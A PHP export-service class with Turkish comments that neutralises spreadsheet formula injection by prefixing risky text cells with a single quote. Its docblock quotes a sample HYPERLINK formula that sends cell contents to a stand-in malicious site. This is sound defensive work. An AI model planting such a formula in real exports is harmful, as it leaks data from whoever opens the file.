<?php

declare(strict_types=1);

namespace App\Services\Export;

/**
 * ÇIKTI HÜCRESİ GÜVENLİĞİ (İE#19 G5 — CSV/XLSX formül enjeksiyonu).
 *
 * TEHDİT: ürün adı, detay, not gibi METİN alanları eklentiden ve kullanıcıdan gelir.
 * Excel/LibreOffice/Google Sheets bir hücreyi `=`, `+`, `-` veya `@` ile başlıyorsa
 * FORMÜL sayar. Yani tedarikçiye gönderdiğimiz listeye eklenen
 * `=HYPERLINK("http://kotu.site?v="&A1,"Tıkla")` gibi bir ad, dosyayı AÇAN kişinin
 * makinesinde çalışır. Bu bizim XSS'imizin ofis dosyasındaki karşılığıdır: zararlı
 * içerik bizim sistemimizde değil, ALICI tarafta patlar — dolayısıyla "bizde sorun
 * çıkmıyor" savunması geçersizdir.
 *
 * POLİTİKA (docs/06 ve docs/10'da kayıtlı):
 *  • Yalnız METİN hücrelerine uygulanır. Sayı hücreleri (miktar, fiyat, toplam)
 *    snapshot'tan zaten doğrulanmış ondalık string olarak gelir; onlara dokunmak
 *    negatif değerleri bozardı.
 *  • Riskli önek varsa hücrenin başına TEK TIRNAK (') konur. Excel bunu "bu bir
 *    metindir" işareti sayar ve hücrede GÖSTERMEZ; CSV'yi düz metin okuyan taraf
 *    ise tırnağı görür — okunabilirlik bedeli bilinçlidir, güvenlik önce gelir.
 *  • Baştaki TAB/CR/LF de tetikleyicidir (uygulamalar kırpıp kalanı formül sayar),
 *    bu yüzden onlarla başlayan değerler de işaretlenir.
 *  • Değer değiştirilmez, yalnız ÖNEKLENİR: veri kaybı yoktur.
 */
final class SafeCell
{
    /** Formül olarak yorumlanabilen ilk karakterler. */
    private const RISKLI_ONEKLER = ['=', '+', '-', '@'];

    /** Uygulamaların kırpıp ardındaki karakteri değerlendirdiği boşluk kontrolleri. */
    private const KONTROL_ONEKLERI = ["\t", "\r", "\n"];

    /** Metin hücresini güvenli hâle getirir (sayı hücreleri için KULLANILMAZ). */
    public static function text(mixed $value): string
    {
        $metin = is_string($value) ? $value : (is_scalar($value) ? (string) $value : '');
        if ($metin === '') {
            return '';
        }

        return self::riskli($metin) ? "'" . $metin : $metin;
    }

    /** Bu değer bir hesap tablosunda formül olarak yorumlanabilir mi? */
    public static function riskli(string $metin): bool
    {
        if ($metin === '') {
            return false;
        }

        $ilk = $metin[0];
        if (in_array($ilk, self::KONTROL_ONEKLERI, true)) {
            return true;
        }

        // Baştaki kontrol karakterleri kırpıldıktan sonra riskli önek çıkıyor mu?
        $kirpilmis = ltrim($metin, " \t\r\n");

        return in_array($ilk, self::RISKLI_ONEKLER, true)
            || ($kirpilmis !== '' && in_array($kirpilmis[0], self::RISKLI_ONEKLER, true));
    }
}
